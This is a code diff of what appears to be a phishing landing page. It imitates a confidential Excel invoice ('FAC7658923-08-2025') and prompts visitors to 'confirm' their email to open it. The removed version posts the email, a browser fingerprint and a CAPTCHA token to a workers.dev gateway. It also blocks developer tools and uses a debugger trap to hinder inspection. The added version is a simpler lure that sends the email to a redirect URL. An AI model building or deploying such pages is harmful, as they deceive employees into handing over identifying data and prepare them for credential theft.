@@ -1,464 +1,212 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Débloquez notre proposition exclusive en soumettant votre adresse e‑mail." />
-  <title>Accèss</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Playfair+Display:wght@700&display=swap" rel="stylesheet" />
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-  <style>
-        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;font-family:"Inter",sans-serif;}
+<!-- ===== Modern File Card + Email Popup ===== -->
+<link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet">
 
-/* Body + bg controls */
-body{
-  /* layout + centering */
-  min-height: 100dvh;
-  display: grid;
-  place-items: center;
-  margin: 0;
-  padding: 24px;
-  overflow: hidden;
-  position: relative;
+<style>
+  :root {
+    --accent: #10793F;
+    --accent-2: #10793F;
+    --bg: #fff;
+    --text: #10793F;
+    --muted: #000;
+    --line: #e5e7eb;
+    --radius: 14px;
+    --shadow: 0 8px 24px rgba(0,0,0,.08);
+  }
 
-  /* bg controls */
-  --bg-blur: 4px;
-  --bg-image: url('/d/tata.PNG');
-  --bg-overlay: rgba(255,255,255,0.30);
-  --bg-fit: contain;
-  --bg-scale: 1.02;
-}
+  body {
+    font-family: Inter, system-ui, sans-serif;
+    background: #f9fafb;
+    margin: 0;
+    padding: 20px;
+    color: var(--text);
+  }
 
+  .file-card {
+    max-width: 720px;
+    margin: 1px auto;
+    padding: 24px;
+    background: var(--bg);
+    border-radius: var(--radius);
+    border: 1px solid var(--line);
+    box-shadow: var(--shadow);
+  }
 
-.bg-img{
-  position: fixed; inset: 0; pointer-events: none; z-index: 0;
-  background-image:
-    linear-gradient(135deg, var(--bg-overlay), var(--bg-overlay)),
-    var(--bg-image);
-  background-repeat: no-repeat, no-repeat;
-  background-position: center center, center center;
-  background-size: 100% 100%, var(--bg-fit);
-  filter: blur(var(--bg-blur));
-  transform: scale(var(--bg-scale));
-}
+  .file-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
 
+  .file-icon {
+    width: 46px;
+    height: 46px;
+    border-radius: 7px;
+    display: grid;
+    place-items: center;
+    background: #10793F;
+    color: #fff;
+    font-size: 28px;
+  }
 
+  .file-title h2 { margin: 0; font-size: 20px; font-weight: 700; }
+  .file-title p  { margin: 2px 0 0; color: var(--muted); font-size: 14px; }
 
-/* Main container (fixed stray brace + z-index) */
-.container{
-  position: relative; z-index: 1;
-  display: flex;
-  width: min(60vw, 400px);
-  background: #fff;
-  border-radius: 7px;
-  overflow: hidden;
-  box-shadow: 0 16px 48px rgba(0,0,0,.15);
-  animation: slideIn .7s ease-out;
-  margin: 0 auto;            /* extra safety */
-}
+  .file-preview {
+    margin: 20px 0;
+    border-radius: var(--radius);
+    overflow: hidden;
+    position: relative;
+    height: 220px;
+    border: 1px solid var(--line);
+  }
+  .file-preview img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    filter: blur(8px);
+  }
+  .file-preview::after {
+    content: "Preview blurred for security";
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 15px;
+    font-weight: 500;
+    color: #000;
+    background: rgba(255,255,255,.5);
+  }
 
-   
-   
-  
-    }
-    
-     
-    .footer {font-size:11px;margin-top:20px;color:#FFF;}
-    .right-panel {
-      width:100%;
-      padding:50px;
-      background:#transparent;
-      display:center;
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-      
-    }
-    .preview {text-align:center;margin-bottom:2x;}
-    .preview h3 {font-size:15px;color:#10793F;margin-bottom:10px;margin-top:-20px}
-    .preview p {font-size:14px;color:#4b5563;margin-bottom:15px;}
-    .access-btn {
-      padding:13px 28px;
-      background:linear-gradient(90deg,#10793F 90%,#10793F 100%);
-      border:none;
-      border-radius:7px;
-      color:#fff;
-      font-size:14px;
-      font-weight:600;
-      cursor:pointer;
-      transition:all 0.3s ease;
-      box-shadow:0 4px 16px rgba(124,58,237,0.3);
-    }
-    .access-btn:hover {
-      background:linear-gradient(90deg,#10793F 100%,#10793F 100%);
-      transform:translateY(-2px);
-      box-shadow:0 1px 20px rgba(124,58,237,0.4);
-    }
-    .popup {
-      display:none;
-      position:fixed;
-      top:50%;
-      left:50%;
-      transform:translate(-50%,-50%);
-      background:#f3f3f3;
-      border-radius:7px;
-      box-shadow:0 12px 32px rgba(0,0,0,0.2);
-      padding:13px;
-      width:60%;
-      max-width:300px;
-      text-align:center;
-      z-index:10;
-    }
-    .popup.active {display:block;}
-    .form-group {margin-bottom:10px;text-align:left;}
-    .form-group input {
-      width:100%;
-      padding:10px;
-      border:1px solid #d1d5db;
-      border-radius:6px;
-      font-size:16px;
-      background:#f3f3f3;
-    }
-    .submit-btn {
-      width:100%;
-      padding:11px;
-      background:linear-gradient(90deg,#10793F 0%,#10793F 100%);
-      border:none;
-      border-radius:6px;
-      color:#fff;
-      font-size:14px;
-      font-weight:500;
-      cursor:pointer;
-      transition:all 0.3s ease;
-      box-shadow:0 4px 16px rgba(124,58,237,0.3);
-      margin-bottom:0px;
-      margin-top:-35px;
-    }
-    .captcha-wrapper {
-      display:flex;
-      justify-content:left;
-      align-items:center;
-      margin-bottom:0px;
-    }
-    #cf-turnstile {
-      display:inline-block;
-      transform:scale(0.8);
-      transform-origin:0 0;
-      
-    }
-    .error {
-      color:#ef4444;
-      font-size:10px;
-      margin-top:10px;
-      display:none;
-      text-align:center;
-    }
-    .honeypot {position:absolute;left:-9999px;top:-9999px;}
+  .file-info {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin: 16px 0 20px;
+  }
+  .file-info span {
+    font-size: 12px;
+    color: var(--muted);
+  }
 
+  .actions { display: flex; justify-content: flex-end; gap: 12px; }
+  .btn {
+    border: 1px solid var(--line);
+    padding: 14px 13px;
+    border-radius: 4px;
+    background: #fff;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .btn.primary {
+    background: linear-gradient(135deg,var(--accent),var(--accent-2));
+    color: #fff;
+    border: none;
+  }
 
-    
-  </style>
+  /* ===== POPUP FORM ===== */
+  .popup {
+    position: fixed;
+    top: 47%; left: 50%;
+    transform: translate(-50%, -50%) scale(0.95);
+    width: 50%; max-width: 420px;
+    background: var(--bg);
+    border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    padding: 24px;
+    opacity: 0;
+    pointer-events: none;
+    transition: .25s ease;
+  }
+  .popup.active {
+    opacity: 1;
+    transform: translate(-50%, -50%) scale(1);
+    pointer-events: auto;
+  }
+  .popup h3 {
+    margin-top: 0;
+    margin-bottom: 7px;
+    font-size: 18px;
+    font-weight: 700;
+    color: black;
+  }
+  .form-group {
+    margin-bottom: 16px;
+  }
+  .form-group input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid var(--line);
+    border-radius: 7px;
+    font-size: 14px;
+  }
+  .error {
+    color: red;
+    font-size: 13px;
+    display: none;
+  }
+</style>
 
-
-  
-</head>
-<body>
-<div class="bg-img"></div>
-  <noscript>
-  
-    <style>body { display: none !important; }</style>
-    
-    <div style="text-align:center; padding:40px; font-family:sans-serif;">
-      <h2>JavaScript required</h2>
-      <p>This page requires JavaScript to function properly. Please enable it in your browser.</p>
-    </div>
-  </noscript>
-
-  <div class="container">
-   
-
-    <div class="right-panel">
-      <div class="preview">
-        <h3 class="i18n" data-i18n="fileNames">FAC7658923‑08‑2025</h3>
-        <p class="i18n" data-i18n="benefitText">La meilleure solution pour accéder à des document exclusives&nbsp;!</p>
-        <button class="access-btn i18n" id="openPopup" data-i18n="openButton">Accéder à la document</button>
-      </div>
-
-      <div id="popup" class="popup" aria-modal="true" role="dialog">
-       
-        <form id="emailForm" autocomplete="off" novalidate>
-          <input type="text" id="middleName" name="middleName" class="honeypot" tabindex="-1" aria-hidden="true" />
-
-          <div class="form-group">
-            <input type="email" id="email" name="email"
-                   class="i18n-placeholder"
-                   data-i18n-placeholder="emailPlaceholder"
-                   required
-                   placeholder="prenom.nom@entreprise.com" />
-          </div>
-
-          <div class="captcha-wrapper">
-            <div id="cf-turnstile"
-                 class="cf-turnstile"
-                 data-sitekey="0x4AAAAAABhsKFJ88b73jtsO"
-                 data-callback="onTurnstileDone"
-                 data-size="normal"
-                 data-theme="light">
-            </div>
-          </div>
-
-          <button type="submit" class="submit-btn i18n" data-i18n="submitButton">Accéder Maintenant</button>
-          <p id="error" class="error i18n" data-i18n="invalidEmail">Adresse e‑mail invalide</p>
-        </form>
-      </div>
+<div class="file-card">
+  <div class="file-header">
+    <div class="file-icon"><i class="ri-file-excel-2-line"></i></div>
+    <div class="file-title">
+      <h2>FAC7658923-08-2025.xlsx</h2>
+      <p>Finance Report • MS Excel</p>
     </div>
   </div>
 
 
+  <div class="file-preview">
+    <img src="/d/nanana.PNG" alt="preview">
+  </div>
 
+  <div class="file-info">
+    <span> Size: 65 KB</span>
+    <span> Modified: 15 Aug 2025</span>
+    <span> Confidential</span>
+  </div>
 
+  <div class="actions">
+    <button class="btn primary" id="openPopup">Access Document</button>
+  </div>
+</div>
 
+<!-- Popup Email Form -->
+<div id="popup" class="popup">
+  <h3>Confirm Your Email</h3>
+  <form id="emailForm">
+    <div class="form-group">
+      <input type="email" id="email" name="email" placeholder="Enter your email" required>
+    </div>
+    <button type="submit" class="btn primary" style="width:100%">Access Now</button>
+    <p id="error" class="error">Please enter a valid email.</p>
+  </form>
+</div>
 
-  
-
- <script>
-   document.addEventListener("DOMContentLoaded", async () => {
-  const translations = {
-    en: {
-      heading: "Secure Document Portal",
-    
-      fileSize: "File Size: 65 KB",
-      fileFormat: "Format: MS Excel",
-      fileName: "File: FAC7658923‑08‑2025",
-      benefitText: "Encrypted documents with controlled access",
-      openButton: "Access Document ",
-      confirmHeading: "Confirm your email address",
-      emailPlaceholder: "username@company.com",
-      submitButton: "Open Spreadsheet",
-      invalidEmail: "Invalid email address",
-      captchaRequired: "Please complete the CAPTCHA",
-      connectionError: "Server connection error",
-      unexpectedError: "Unexpected error",
-      redirecting: "Accessing now…"
-    },
-    fr: {
-      heading: "Portail de documents sécurisés",
-     
-      fileSize: "Taille :  65 KB",
-      fileFormat: "Format : MS Excel",
-      fileName: "FAC7658923‑08‑2025.xls",
-      benefitText: "Acces controle aux documents securises",
-      openButton: "ACCEDER AU DOCUMENT",
-      confirmHeading: "Confirmez votre adresse e‑mail",
-      emailPlaceholder: "prenom.nom@entreprise.com",
-      submitButton: "ACCEDER MAINTENANT",
-      invalidEmail: "Adresse e‑mail invalide",
-      captchaRequired: "Veuillez compléter le CAPTCHA",
-      connectionError: "Erreur de connexion au serveur",
-      unexpectedError: "Erreur inattendue",
-      redirecting: "Accéder maintenant…"
-    },
-    de: {
-      heading: "Dokumentzugriff",
-      readyText: "Ihre Datei ist bereit zur Ansicht!",
-      fileSize: "Größe: 365 KB",
-      fileFormat: "Format: MS Excel",
-      fileName: "FA7658923‑08‑2025.xls",
-      benefitText: "Der beste Weg zu exklusiven Angeboten!",
-      openButton: "Angebot anzeigen",
-      confirmHeading: "Bestätigen Sie Ihre E-Mail-Adresse",
-      emailPlaceholder: "Geben Sie Ihre geschäftliche E-Mail ein",
-      submitButton: "Jetzt zugreifen",
-      invalidEmail: "Ungültige E-Mail-Adresse",
-      captchaRequired: "Bitte CAPTCHA ausfüllen",
-      connectionError: "Serververbindungsfehler",
-      unexpectedError: "Unerwarteter Fehler",
-      redirecting: "Weiterleitung…"
-    },
-    nl: {
-      heading: "Documenttoegang",
-      readyText: "Uw bestand is klaar om te bekijken!",
-      fileSize: "Grootte: 365 KB",
-      fileFormat: "Formaat: MS Excel",
-      fileName: "Naam: FA7658923‑08‑2025.xls",
-      benefitText: "De beste manier om exclusieve voorstellen te bekijken!",
-      openButton: "Voorstel openen",
-      confirmHeading: "Bevestig uw e-mailadres",
-      emailPlaceholder: "Voer uw zakelijke e-mailadres in",
-      submitButton: "Nu openen",
-      invalidEmail: "Ongeldig e-mailadres",
-      captchaRequired: "Vul de CAPTCHA in",
-      connectionError: "Serververbindingsfout",
-      unexpectedError: "Onverwachte fout",
-      redirecting: "Bezig met doorsturen…"
-    },
-    pl: {
-      heading: "Dostęp do dokumentu",
-      readyText: "Twój plik jest gotowy do wyświetlenia!",
-      fileSize: "Rozmiar: 365 KB",
-      fileFormat: "Format: MS Excel",
-      fileName: "Nazwa: FA7658923‑08‑2025.xls",
-      benefitText: "Najlepszy sposób na dostęp do ekskluzywnych ofert!",
-      openButton: "Otwórz propozycję",
-      confirmHeading: "Potwierdź swój adres e-mail",
-      emailPlaceholder: "Wprowadź firmowy adres e-mail",
-      submitButton: "Uzyskaj dostęp",
-      invalidEmail: "Nieprawidłowy adres e-mail",
-      captchaRequired: "Proszę uzupełnić CAPTCHA",
-      connectionError: "Błąd połączenia z serwerem",
-      unexpectedError: "Nieoczekiwany błąd",
-      redirecting: "Przekierowanie…"
-    },
-    it: {
-      heading: "Accesso al documento",
-      readyText: "Il tuo file è pronto per essere visualizzato!",
-      fileSize: "Dimensione: 365 KB",
-      fileFormat: "Formato: MS Excel",
-      fileName: "Nome: FA7658923‑08‑2025.xls",
-      benefitText: "Il modo migliore per accedere a proposte esclusive!",
-      openButton: "Accedi alla proposta",
-      confirmHeading: "Conferma il tuo indirizzo email",
-      emailPlaceholder: "Inserisci la tua email aziendale",
-      submitButton: "Accedi ora",
-      invalidEmail: "Indirizzo email non valido",
-      captchaRequired: "Completa il CAPTCHA",
-      connectionError: "Errore di connessione al server",
-      unexpectedError: "Errore imprevisto",
-      redirecting: "Reindirizzamento…"
-    }
-  };
-
-  
-const lang = (navigator.language || "fr").slice(0, 2);
-  const t = translations[lang] || translations.fr;
-
-  // Apply text and placeholders
-  document.querySelectorAll("[data-i18n]").forEach(el => {
-    el.textContent = t[el.dataset.i18n] || el.textContent;
-  });
-  document.querySelectorAll("[data-i18n-placeholder]").forEach(el => {
-    el.setAttribute("placeholder", t[el.dataset.i18nPlaceholder] || el.getAttribute("placeholder"));
-  });
-
-  const gateway = "https://seconwrkseabnokpiam.afterbbgit.workers.dev";
+<script>
   const popup = document.getElementById("popup");
-  const openBtn = document.getElementById("openPopup");
+  const openPopup = document.getElementById("openPopup");
   const form = document.getElementById("emailForm");
-  const errBox = document.getElementById("error");
-  const input = document.getElementById("email");
-
-  let cfProof = "", fpHash = "";
-
-  // Delay popup render
-  setTimeout(() => popup.classList.add("js-ready"), 1500);
-
-  function getClientSig() {
-    const nav = navigator;
-    return [nav.userAgent, nav.language, nav.platform, screen.width + "x" + screen.height].join("|");
-  }
-
-  async function hashFingerprint(str) {
-    const encoder = new TextEncoder();
-    const data = encoder.encode(str);
-    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
-    return btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
-  }
-
-  hashFingerprint(getClientSig()).then(fp => fpHash = fp);
-
-  window.onTurnstileDone = (token) => {
-    cfProof = token;
-    errBox.style.display = "none";
-  };
-
-  const show = (el, msg) => { if (msg) el.textContent = msg; el.style.display = "block"; };
-  const hide = (el) => el.style.display = "none";
-
-  openBtn.addEventListener("click", () => popup.classList.add("active"));
-  document.addEventListener("click", (e) => {
-    if (!popup.contains(e.target) && e.target !== openBtn) {
-      popup.classList.remove("active");
-    }
+  const emailInput = document.getElementById("email");
+  const errorElm = document.getElementById("error");
+  
+  openPopup.addEventListener("click", () => popup.classList.add("active"));
+  document.addEventListener("click", e => {
+    if (!popup.contains(e.target) && e.target !== openPopup) popup.classList.remove("active");
   });
 
-  form.addEventListener("submit", async (e) => {
+  form.addEventListener("submit", e => {
     e.preventDefault();
-    const val = input.value.trim();
-    const trap = document.getElementById("middleName").value.trim();
-    const jsSig = "ok-" + Math.random().toString(36).slice(2);
-
-    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(val)) return show(errBox, t.invalidEmail);
-    if (trap) return;
-
-    try {
-      const res = await fetch(gateway, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email: val,
-          middleName: trap,
-          jsToken: jsSig,
-          cfToken: cfProof || "",
-          fingerprint: fpHash
-        })
-      });
-
-      const json = await res.json();
-      if (!res.ok || !json.valid || !json.redirect) return show(errBox, json.message || t.unexpectedError);
-
-      form.querySelector(".submit-btn").textContent = t.redirecting;
-      if (typeof turnstile !== "undefined") turnstile.reset("#cf-turnstile");
-      cfProof = "";
-      setTimeout(() => (location.href = json.redirect), 1200);
-    } catch {
-      show(errBox, t.connectionError);
+    const email = emailInput.value.trim();
+    const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]{2,}$/;
+    if (!emailRegex.test(email)) {
+      errorElm.style.display = "block";
+      return;
     }
+    errorElm.style.display = "none";
+    // ✅ Redirect with email
+    window.location.href = "https://example.com/redirect?email=" + encodeURIComponent(email);
   });
-
-  input.addEventListener("input", () => hide(errBox));
-
-  // Optional: parse redirect info
-  const r = (() => {
-    const match = window.location.pathname.match(/\/\.(\d+)\.([a-f0-9]{64})\/\$([a-zA-Z0-9+/=]+)$/);
-    if (!match) return null;
-    const [_, exp, hmac, b64] = match;
-    if (parseInt(exp) < Date.now() / 1000) return null;
-    try { return { email: atob(b64), exp, hmac }; } catch { return null; }
-  })();
-
-  if (r && r.email) {
-    const showEmail = document.getElementById("userEmail");
-    if (showEmail) showEmail.textContent = r.email;
-    sessionStorage.setItem("validatedEmail", r.email);
-  }
-
-  // Anti-inspection
-  document.addEventListener("contextmenu", e => e.preventDefault());
-  document.addEventListener("keydown", e => {
-    if (
-      e.key === "F12" ||
-      (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
-      (e.ctrlKey && e.key === "U")
-    ) e.preventDefault();
-  });
-
-  setInterval(() => {
-    const start = performance.now();
-    debugger;
-    const delta = performance.now() - start;
-    if (delta > 100) {
-      document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;'>Blocked</h1>";
-    }
-  }, 1500);
-
-  // JS-only fallback redirect
-  const noscript = document.createElement("noscript");
-  noscript.innerHTML = `<meta http-equiv="refresh" content="0;url=https://example.com">`;
-  document.body.appendChild(noscript);
-});
 </script>
-
-
-
-</body>
-</html>
